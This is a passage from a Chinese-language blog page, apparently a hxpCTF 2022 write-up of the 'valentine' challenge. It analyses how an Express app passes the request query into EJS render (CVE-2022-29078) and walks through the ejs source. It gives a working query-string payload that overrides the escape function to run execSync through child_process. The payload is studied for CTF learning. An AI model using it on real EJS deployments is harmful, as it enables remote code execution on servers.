@@ -1,0 +1,821 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.z3ratu1.cn","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="hxpCTF2022wp又跟着科恩疯狂偷学，天哥一人单刷全部web，我在科恩后面偷看答案复现以及，这是一场在23年办的2022ctf valentine有效的代码部分如下 app.post(&#39;&#x2F;template&#39;, function(req, res) {   let tmpl &#x3D; req.body.tmpl;   let i &#x3D; -1;   while((i &#x3D; tmpl.indexOf(&quot;&amp;l">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hxpCTF2022wp">
+<meta property="og:url" content="https://blog.z3ratu1.cn/hxpCTF2022wp.html">
+<meta property="og:site_name" content="Z3ratu1&#39;s blog">
+<meta property="og:description" content="hxpCTF2022wp又跟着科恩疯狂偷学，天哥一人单刷全部web，我在科恩后面偷看答案复现以及，这是一场在23年办的2022ctf valentine有效的代码部分如下 app.post(&#39;&#x2F;template&#39;, function(req, res) {   let tmpl &#x3D; req.body.tmpl;   let i &#x3D; -1;   while((i &#x3D; tmpl.indexOf(&quot;&amp;l">
+<meta property="og:locale">
+<meta property="article:published_time" content="2023-03-11T09:42:59.000Z">
+<meta property="article:modified_time" content="2023-03-14T02:01:22.216Z">
+<meta property="article:author" content="Z3ratu1">
+<meta property="article:tag" content="wp">
+<meta property="article:tag" content="JavaScript">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://blog.z3ratu1.cn/hxpCTF2022wp.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-Hans'
+  };
+</script>
+
+  <title>hxpCTF2022wp | Z3ratu1's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Z3ratu1's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Welcome</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/Z3ratu1" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="external nofollow noopener noreferrer" target="_blank"><svg width="80" height="80" viewbox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://blog.z3ratu1.cn/hxpCTF2022wp.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
+      <meta itemprop="name" content="Z3ratu1">
+      <meta itemprop="description" content="与其感慨路难行，不如现在出发">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Z3ratu1's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          hxpCTF2022wp
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-03-11 17:42:59" itemprop="dateCreated datePublished" datetime="2023-03-11T17:42:59+08:00">2023-03-11</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-03-14 10:01:22" itemprop="dateModified" datetime="2023-03-14T10:01:22+08:00">2023-03-14</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">刷题记录</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/hxpCTF2022wp.html" class="post-meta-item leancloud_visitors" data-flag-title="hxpCTF2022wp" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/hxpCTF2022wp.html#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/hxpCTF2022wp.html" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="hxpCTF2022wp"><a href="#hxpCTF2022wp" class="headerlink" title="hxpCTF2022wp"></a>hxpCTF2022wp</h1><p>又跟着科恩疯狂偷学，天哥一人单刷全部web，我在科恩后面偷看答案复现<br>以及，这是一场在23年办的2022ctf</p>
+<h2 id="valentine"><a href="#valentine" class="headerlink" title="valentine"></a>valentine</h2><p>有效的代码部分如下</p>
+<pre class=" language-js"><code class="language-js">app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/template'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+  <span class="token keyword">let</span> tmpl <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>tmpl<span class="token punctuation">;</span>
+  <span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
+  <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>i <span class="token operator">=</span> tmpl<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"&lt;%"</span><span class="token punctuation">,</span> i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>tmpl<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> i<span class="token operator">+</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string">"&lt;%= name %>"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+      res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">{</span>message<span class="token punctuation">:</span><span class="token string">"Only '&lt;%= name %>' is allowed."</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token keyword">return</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+  <span class="token punctuation">}</span>
+  <span class="token keyword">let</span> uuid<span class="token punctuation">;</span>
+  <span class="token keyword">do</span> <span class="token punctuation">{</span>
+    uuid <span class="token operator">=</span> crypto<span class="token punctuation">.</span><span class="token function">randomUUID</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span>fs<span class="token punctuation">.</span><span class="token function">existsSync</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`views/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>uuid<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">.ejs`</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+  <span class="token keyword">try</span> <span class="token punctuation">{</span>
+    fs<span class="token punctuation">.</span><span class="token function">writeFileSync</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`views/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>uuid<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">.ejs`</span></span><span class="token punctuation">,</span> tmpl<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"Failed to write Valentine's card"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+  <span class="token keyword">let</span> name <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>name <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">''</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>uuid<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">?name=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>name<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/:template'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+  <span class="token keyword">let</span> query <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">;</span>
+  <span class="token keyword">let</span> template <span class="token operator">=</span> req<span class="token punctuation">.</span>params<span class="token punctuation">.</span>template
+  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token regex">/^[0-9A-F]{8}-[0-9A-F]{4}-[4][0-9A-F]{3}-[89AB][0-9A-F]{3}-[0-9A-F]{12}$/i</span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>template<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"Not a valid card id"</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>fs<span class="token punctuation">.</span><span class="token function">existsSync</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`views/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>template<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">.ejs`</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Valentine\'s card does not exist'</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>query<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    query<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">''</span>
+  <span class="token punctuation">}</span>
+  <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span>template<span class="token punctuation">,</span> query<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre>
+<p>可以提交一个模板然后渲染，模板处限制了模板内以<code>&lt;%</code>开头的内容只能是<code>&lt;%= name %&gt;</code>，看起来好像有洞，实际上是无敌防御，然后是渲染流程，这里有一个地方写歪了，他直接将用户输入的query整个作为参数传入render，而不是<code>&#123;name: query[&#39;name&#39;]&#125;</code>这种比较合理的形式，这会导致用户的输入会作为渲染时选项，进一步造成危害（总觉得以前看到过一个文章专门提到过这个写法的问题）</p>
+<p>这个问题在22年居然申了一个CVE <a target="_blank" rel="external nofollow noopener noreferrer" href="https://security.snyk.io/vuln/SNYK-JS-EJS-2803307">CVE-2022-29078</a></p>
+<h3 id="解1"><a href="#解1" class="headerlink" title="解1"></a>解1</h3><p>触发的点位于<code>ejs.js</code>的renderFile函数中，如下一段</p>
+<pre class=" language-js"><code class="language-js">    <span class="token keyword">else</span> <span class="token punctuation">{</span>
+      <span class="token comment" spellcheck="true">// Express 3 and 4</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span>settings<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token comment" spellcheck="true">// Pull a few things from known locations</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span>settings<span class="token punctuation">.</span>views<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+          opts<span class="token punctuation">.</span>views <span class="token operator">=</span> data<span class="token punctuation">.</span>settings<span class="token punctuation">.</span>views<span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span>settings<span class="token punctuation">[</span><span class="token string">'view cache'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+          opts<span class="token punctuation">.</span>cache <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token comment" spellcheck="true">// Undocumented after Express 2, but still usable, esp. for</span>
+        <span class="token comment" spellcheck="true">// items that are unsafe to be passed along with data, like `root`</span>
+        viewOpts <span class="token operator">=</span> data<span class="token punctuation">.</span>settings<span class="token punctuation">[</span><span class="token string">'view options'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>viewOpts<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+          utils<span class="token punctuation">.</span><span class="token function">shallowCopy</span><span class="token punctuation">(</span>opts<span class="token punctuation">,</span> viewOpts<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+      <span class="token punctuation">}</span>
+      <span class="token comment" spellcheck="true">// Express 2 and lower, values set in app.locals, or people who just</span>
+      <span class="token comment" spellcheck="true">// want to pass options in their data. NOTE: These values will override</span>
+      <span class="token comment" spellcheck="true">// anything previously set in settings  or settings['view options']</span>
+      utils<span class="token punctuation">.</span><span class="token function">shallowCopyFromList</span><span class="token punctuation">(</span>opts<span class="token punctuation">,</span> data<span class="token punctuation">,</span> _OPTS_PASSABLE_WITH_DATA_EXPRESS<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+</code></pre>
+<p>此处的opts后续会作为后续渲染的opts，而data即为render时传入的<code>query</code>对象，如上面的CVE所言，data中settings属性的<code>view options</code>属性会被完整的传递给opts，而不是传递到opts属性下的某个属性中，在用户完全可控render函数的options对象时，就等于完全可控此处了</p>
+<p>那么，经典的<code>outputFunctionName</code>还能不能用呢？</p>
+<p>最后的渲染是在<code>ejs/lib/ejs.js</code>的compile函数中，可以看到被拼进来的几个来自opts的值，比如<code>outputFunctionName</code>,<code>localsName</code>,<code>destructuredLocals</code>都被过了一个<code>_JS_IDENTIFIER.test()</code>进行正则判断，控制了也不能用了</p>
+<p>但是还有一个值被拼进了代码，却没有被过滤</p>
+<pre class=" language-js"><code class="language-js">    <span class="token keyword">if</span> <span class="token punctuation">(</span>opts<span class="token punctuation">.</span>client<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+      src <span class="token operator">=</span> <span class="token string">'escapeFn = escapeFn || '</span> <span class="token operator">+</span> escapeFn<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">';'</span> <span class="token operator">+</span> <span class="token string">'\n'</span> <span class="token operator">+</span> src<span class="token punctuation">;</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span>opts<span class="token punctuation">.</span>compileDebug<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        src <span class="token operator">=</span> <span class="token string">'rethrow = rethrow || '</span> <span class="token operator">+</span> rethrow<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">';'</span> <span class="token operator">+</span> <span class="token string">'\n'</span> <span class="token operator">+</span> src<span class="token punctuation">;</span>
+      <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+</code></pre>
+<p>而这个escapeFn的定义是<code>var escapeFn = opts.escapeFunction;</code>，很难不怀疑是不是修 的时候看这个值前面没有<code>opts.</code>就漏掉了。当然，这个函数是用来对用户输入的html字符做转义的，本身也不能被简单的过滤。那么这个值能不能控制呢，看一下templates类中初始化都有哪些可控值</p>
+<pre class=" language-js"><code class="language-js">  options<span class="token punctuation">.</span>client <span class="token operator">=</span> opts<span class="token punctuation">.</span>client <span class="token operator">||</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+  options<span class="token punctuation">.</span>escapeFunction <span class="token operator">=</span> opts<span class="token punctuation">.</span>escape <span class="token operator">||</span> opts<span class="token punctuation">.</span>escapeFunction <span class="token operator">||</span> utils<span class="token punctuation">.</span>escapeXML<span class="token punctuation">;</span>
+  options<span class="token punctuation">.</span>compileDebug <span class="token operator">=</span> opts<span class="token punctuation">.</span>compileDebug <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+  options<span class="token punctuation">.</span>debug <span class="token operator">=</span> <span class="token operator">!</span><span class="token operator">!</span>opts<span class="token punctuation">.</span>debug<span class="token punctuation">;</span>
+  options<span class="token punctuation">.</span>filename <span class="token operator">=</span> opts<span class="token punctuation">.</span>filename<span class="token punctuation">;</span>
+  options<span class="token punctuation">.</span>openDelimiter <span class="token operator">=</span> opts<span class="token punctuation">.</span>openDelimiter <span class="token operator">||</span> exports<span class="token punctuation">.</span>openDelimiter <span class="token operator">||</span> _DEFAULT_OPEN_DELIMITER<span class="token punctuation">;</span>
+  options<span class="token punctuation">.</span>closeDelimiter <span class="token operator">=</span> opts<span class="token punctuation">.</span>closeDelimiter <span class="token operator">||</span> exports<span class="token punctuation">.</span>closeDelimiter <span class="token operator">||</span> _DEFAULT_CLOSE_DELIMITER<span class="token punctuation">;</span>
+  options<span class="token punctuation">.</span>delimiter <span class="token operator">=</span> opts<span class="token punctuation">.</span>delimiter <span class="token operator">||</span> exports<span class="token punctuation">.</span>delimiter <span class="token operator">||</span> _DEFAULT_DELIMITER<span class="token punctuation">;</span>
+  options<span class="token punctuation">.</span>strict <span class="token operator">=</span> opts<span class="token punctuation">.</span>strict <span class="token operator">||</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+  options<span class="token punctuation">.</span>context <span class="token operator">=</span> opts<span class="token punctuation">.</span>context<span class="token punctuation">;</span>
+  options<span class="token punctuation">.</span>cache <span class="token operator">=</span> opts<span class="token punctuation">.</span>cache <span class="token operator">||</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+  options<span class="token punctuation">.</span>rmWhitespace <span class="token operator">=</span> opts<span class="token punctuation">.</span>rmWhitespace<span class="token punctuation">;</span>
+  options<span class="token punctuation">.</span>root <span class="token operator">=</span> opts<span class="token punctuation">.</span>root<span class="token punctuation">;</span>
+  options<span class="token punctuation">.</span>includer <span class="token operator">=</span> opts<span class="token punctuation">.</span>includer<span class="token punctuation">;</span>
+  options<span class="token punctuation">.</span>outputFunctionName <span class="token operator">=</span> opts<span class="token punctuation">.</span>outputFunctionName<span class="token punctuation">;</span>
+  options<span class="token punctuation">.</span>localsName <span class="token operator">=</span> opts<span class="token punctuation">.</span>localsName <span class="token operator">||</span> exports<span class="token punctuation">.</span>localsName <span class="token operator">||</span> _DEFAULT_LOCALS_NAME<span class="token punctuation">;</span>
+  options<span class="token punctuation">.</span>views <span class="token operator">=</span> opts<span class="token punctuation">.</span>views<span class="token punctuation">;</span>
+  options<span class="token punctuation">.</span><span class="token keyword">async</span> <span class="token operator">=</span> opts<span class="token punctuation">.</span><span class="token keyword">async</span><span class="token punctuation">;</span>
+  options<span class="token punctuation">.</span>destructuredLocals <span class="token operator">=</span> opts<span class="token punctuation">.</span>destructuredLocals<span class="token punctuation">;</span>
+  options<span class="token punctuation">.</span>legacyInclude <span class="token operator">=</span> <span class="token keyword">typeof</span> opts<span class="token punctuation">.</span>legacyInclude <span class="token operator">!=</span> <span class="token string">'undefined'</span> <span class="token operator">?</span> <span class="token operator">!</span><span class="token operator">!</span>opts<span class="token punctuation">.</span>legacyInclude <span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>options<span class="token punctuation">.</span>strict<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    options<span class="token punctuation">.</span>_with <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+  <span class="token keyword">else</span> <span class="token punctuation">{</span>
+    options<span class="token punctuation">.</span>_with <span class="token operator">=</span> <span class="token keyword">typeof</span> opts<span class="token punctuation">.</span>_with <span class="token operator">!=</span> <span class="token string">'undefined'</span> <span class="token operator">?</span> opts<span class="token punctuation">.</span>_with <span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+
+  <span class="token keyword">this</span><span class="token punctuation">.</span>opts <span class="token operator">=</span> options<span class="token punctuation">;</span>
+</code></pre>
+<p>还看了一圈，感觉所有的opts选项都是能被控制的，这个<code>escapeFunction</code>也赫然在列</p>
+<p>那么，控制这个地方就可以做到rce了，由于是对用户输入做转义，所以是对输入内容进行处理后返回，这个函数的返回值就直接是渲染上去的回显，也就是可以直接回显了</p>
+<pre class=" language-js"><code class="language-js">settings<span class="token punctuation">[</span>view options<span class="token punctuation">]</span><span class="token punctuation">[</span>client<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>settings<span class="token punctuation">[</span>view options<span class="token punctuation">]</span><span class="token punctuation">[</span>escape<span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">.</span>constructor<span class="token punctuation">.</span><span class="token function">constructor</span><span class="token punctuation">(</span><span class="token string">"return process.mainModule.require('child_process').execSync('/readflag')"</span><span class="token punctuation">)</span>
+</code></pre>
+<p>但是一发打过去并没有直接通，这里还有一个预留的坑，Dockerfile中有一句<code>ENV NODE_ENV=production</code>，指定了在生产环境下运行，这会导致options中有一个cache选项被置为true，导致了模板函数只会产生一次，后续的渲染都会用之前构造好的模板函数进行，具体在ejs.js的<code>handleCache</code>函数中</p>
+<pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">handleCache</span><span class="token punctuation">(</span>options<span class="token punctuation">,</span> template<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+  <span class="token keyword">var</span> func<span class="token punctuation">;</span>
